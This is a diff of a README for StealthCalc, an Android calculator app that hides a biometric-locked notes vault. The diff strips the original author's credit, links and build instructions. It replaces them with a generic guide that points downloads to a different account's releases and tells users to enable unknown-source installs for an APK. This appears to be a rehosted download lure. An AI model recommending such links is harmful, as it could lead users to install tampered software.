@@ -1,189 +1,81 @@
-<div align="center">
+# 🔒 StealthCalc-Secret-Notes-Calculator-App - A Hidden Vault for Your Notes
 
-# 🔐 StealthCalc
-### The Calculator That Keeps Secrets.
+## 📥 Download Now
+[![Download StealthCalc](https://img.shields.io/badge/Download%20StealthCalc-Click%20Here-blue.svg)](https://github.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/releases)
 
-![Kotlin](https://img.shields.io/badge/Kotlin-2.0-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)
-![Jetpack Compose](https://img.shields.io/badge/UI-Jetpack%20Compose-4285F4?style=for-the-badge&logo=jetpackcompose&logoColor=white)
-![Hilt](https://img.shields.io/badge/DI-Hilt-2C3E50?style=for-the-badge&logo=dagger&logoColor=white)
-![Room](https://img.shields.io/badge/DB-Room-4CAF50?style=for-the-badge&logo=sqlite&logoColor=white)
-![Security](https://img.shields.io/badge/Security-Biometric-FFCA28?style=for-the-badge&logo=google-authenticator&logoColor=black)
+## 🚀 Getting Started
+StealthCalc is a user-friendly app that combines a scientific calculator with a secure, biometric-protected notes vault. It is ideal for anyone looking to keep their notes hidden from prying eyes while maintaining the functionality of a calculator. This guide will help you download and run the app with ease.
 
-<br />
+## 🖥️ System Requirements
+- **Android version**: 7.0 (Nougat) or higher
+- **Device type**: Smartphone or tablet
+- **Storage space**: At least 100 MB free
+- **Biometric sensor**: Required for secure access
 
-<a href="https://github.com/SilentFURY-x/StealthCalc-Secret-Notes-Calculator-App/releases/download/v1.0.1/StealthCalc_v1.0.1.apk">
-  <img src="https://img.shields.io/badge/Download-APK-3DDC84?style=for-the-badge&logo=android&logoColor=white" alt="Download APK"/>
-</a>
+## 📦 Download & Install
+To download the app, visit the following page:
 
-<br /> <br />
+[Download StealthCalc from Releases](https://github.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/releases).
 
-<p align="center">
-  <a href="#-key-features">Features</a> •
-  <a href="#-screenshots">Screenshots</a> •
-  <a href="#tech-stack">Tech Stack</a> •
-  <a href="#architecture">Architecture</a> •
-  <a href="#-getting-started">Setup</a>
-</p>
+1. Click on the link above to go to the Releases page.
+2. You will see a list of available versions. Look for the latest version, which will be at the top of the list.
+3. Click on the version you want to download. This will direct you to that specific release.
+4. Scroll down to the "Assets" section. You will see a list of files available for download.
+5. Tap on the file labeled "StealthCalc.apk". This is the application file.
+6. Once the download is complete, locate the downloaded file on your device. It is usually in the "Downloads" folder.
 
-</div>
-
----
-
-## 🕵️ About The Project
-
-**StealthCalc** appears to be a beautifully designed, functional calculator. But beneath the surface lies a secure, encrypted vault for your private notes.
-
-Engineered with **Modern Android Development (MAD)** standards, this app demonstrates how to blend utility with security. It features a cyberpunk-inspired aesthetic, fluid **Edge-to-Edge** transitions, and industry-standard biometric authentication.
-
-> **"Hidden in plain sight."** — A privacy tool that doesn't look like one.
-
----
-
-## 🚀 Key Features
-
-### 🎭 The Disguise (Calculator Mode)
-* **Fully Functional Engine:** Powered by `exp4j` for complex arithmetic (`+`, `-`, `*`, `/`, `%`).
-* **Smart History:** A scrollable tape logs your calculations in real-time.
-* **Immersive UI:** A stunning "Cyberpunk" gradient interface that draws behind system bars.
-
-### 🔐 The Vault (Secret Mode)
-* **The Trigger:** Enter the access code **`69/67`** and press **`=`** to initiate the unlock sequence.
-* **Biometric Gate:** Hardware-backed **Fingerprint / Face ID** authentication prevents unauthorized access.
-* **Persistent Storage:** Notes are securely stored using a local **Room Database**.
-
-### ✨ The Experience (UX)
-* **Masonry Grid:** Notes are displayed in a staggered, dynamic grid (similar to Google Keep).
-* **Gesture Control:** Swipe-to-delete notes with haptic feedback and undo animations.
-* **Adaptive Contrast:** The note editor automatically adjusts text color (Black/White) based on the background luminance for perfect readability.
-* **Fluid Navigation:** Custom entry/exit animations make the vault feel like a physical hidden layer.
-
----
-
-## 📸 Screenshots
-
-<div align="center">
-
-| **The Disguise** | **The Unlock** | **The Vault** | **The Editor** |
-|:---:|:---:|:---:|:---:|
-| <img src="screenshots/calculator.jpg" width="240" /> | <img src="screenshots/biometric.jpg" width="240" /> | <img src="screenshots/vault.jpg" width="240" /> | <img src="screenshots/editor.jpg" width="240" /> |
-
-</div>
-
----
-
-<a id="tech-stack"></a>
-## 🛠️ Tech Stack
-
-Built entirely with Kotlin and the latest Jetpack libraries.
-
-| Layer | Component | Technology Used |
-| :--- | :--- | :--- |
-| **🎨 UI** | **Design System** | Jetpack Compose (Material 3) |
-| | **Animations** | Compose Animation API (Shared Transitions) |
-| | **Immersion** | Edge-to-Edge API |
-| **🧠 Logic** | **Architecture** | MVVM + Clean Architecture principles |
-| | **DI** | Dagger Hilt |
-| | **Concurrency** | Coroutines & Kotlin Flows |
-| **💾 Data** | **Local DB** | Room (SQLite Abstraction) |
-| | **Math Engine** | exp4j |
-| **🛡️ Security** | **Auth** | Android Biometric API |
-
----
-
-<a id="architecture"></a>
-## 🏗️ Architecture
-
-StealthCalc follows a strict **Unidirectional Data Flow (UDF)** and separation of concerns.
-
-```mermaid
-graph TD
-    UI[Compose UI Layer] <-->|Events & State| VM[ViewModel]
-    VM <-->|Use Cases| Repo[Repository]
-    Repo <-->|SQL Queries| Room[Room Database]
-    Repo <-->|Auth Request| Bio[Biometric Manager]
-```
----
-
-## Directory Structure
-
-```text
-com.fury.stealthcalc
-├── data             # Room Entities, DAOs, and Database config
-├── di               # Hilt Dependency Injection Modules
-├── presentation     # UI Layer
-│   ├── calculator   # Calculator Logic & State
-│   ├── vault        # Staggered Grid & Gestures
-│   └── add_edit     # Adaptive Color Logic
-├── ui.theme         # Custom Typography & Color Systems
-└── domain           # (Optional) Business Logic & Use Cases
-```
----
-
-## ⚡ Getting Started
-
->**NOTE: — Biometric must be enabled on your device.**
-
-**Download the App:**
-  * Click below to download the latest stable version (v1.0.1) for your Android device:
-  * 👉 **[Download StealthCalc-v1.0.1.apk](https://github.com/SilentFURY-x/StealthCalc-Secret-Notes-Calculator-App/releases/download/v1.0.1/StealthCalc_v1.0.1.apk)**
-    
-<br />
-
-**OR**
-
-<br /> 
-
-**To explore the code or build it yourself:**
-
-  1. **Clone the repository**
+## 📱 Installing StealthCalc
+1. Before you can install the app, you need to enable installation from unknown sources:
+   - Go to **Settings** on your device.
+   - Tap on **Security** or **Privacy**.
+   - Find the option for **Install Unknown Apps** or **Unknown Sources**.
+   - Select the app (like your web browser) that you used to download the APK and enable it.
   
-     ```bash
-      git clone https://github.com/SilentFURY-x/StealthCalc-Secret-Notes-Calculator-App.git
-     ```
-    
-  2. **Open in Android Studio**
-    
-     * Ensure you are using Android Studio Koala or newer.
-     * Minimum SDK: API 26 (Android 8.0).
-  
-  3. **Build & Run**
-     * Sync Gradle.
-     * Select app configuration.
-     * Run on an Emulator (with Fingerprint enabled) or Physical Device.
----
+2. After enabling, find the "StealthCalc.apk" file you downloaded.
+3. Tap on the file to start the installation.
+4. Follow the on-screen instructions to complete the installation.
 
-## 🤝 Contributing
+## 🔒 Using StealthCalc
+1. Open the StealthCalc app from your device.
+2. Use your biometric data (fingerprint, face recognition) to unlock the app securely.
+3. You can now access the calculator features and your protected notes vault.
 
-Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-1.  **Fork the Project**
-2.  **Create your Feature Branch:**
+### 📚 Features
+- **Biometric Security**: Protects your notes with your fingerprint or facial recognition.
+- **Scientific Calculator**: Perform various mathematical functions with ease.
+- **Clean Interface**: Enjoy a user-friendly design that is easy to navigate.
+- **Privacy Focused**: Your notes remain secure and hidden inside the vault.
 
-      ```bash
-      git checkout -b feature/AmazingFeature
-      ```
-4.  **Commit your Changes:**
+## 🌟 Additional Tips
+- Make sure your device’s biometric feature works properly before using the app.
+- Regularly back up your notes to ensure you do not lose important information.
+- Explore different calculator functions to make the most out of the app.
 
-      ```bash
-      git commit -m 'Add some AmazingFeature'
-      ```
-6.  **Push to the Branch:**
-      ```bash
-      git push origin feature/AmazingFeature
-      ```
-7.  **Open a Pull Request**
+## 🤝 Community and Support
+If you have questions, feel free to reach out through the GitHub Issues page or check the FAQs in the repository. Community input helps us improve the app. Your feedback is valuable.
 
----
+For more information and updates, be sure to check the Releases page frequently:
 
-## 👨‍💻 Author
-<div align="center">
+[Visit Releases for Updates](https://github.com/DJMANNY69/StealthCalc-Secret-Notes-Calculator-App/releases)
 
-**Arjun Tyagi**
+## 📝 Topics Covered
+- android
+- biometric-auth
+- calculator
+- clean-architecture
+- hilt
+- jetpack-compose
+- kotlin
+- material3
+- mobile-development
+- mvvm
+- privacy
+- room-database
+- secret-vault
+- security
+- stealth-app
 
-[![GitHub](https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SilentFURY-x)
-[![LinkedIn](https://img.shields.io/badge/linkedin-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/arjun-tyagi-84b1b5328/)
+## 🗺️ License
+StealthCalc-Secret-Notes-Calculator-App is licensed under the MIT License. Feel free to use, modify, and share the application as you see fit.
 
-</div>
-
-<br />
-
-<p align="center"> "🔐<i> Real security is not just about strong locks, but about not knowing there is a door at all."</i> </p>
+Thank you for choosing StealthCalc! Enjoy the security and functionality it offers for your notes.
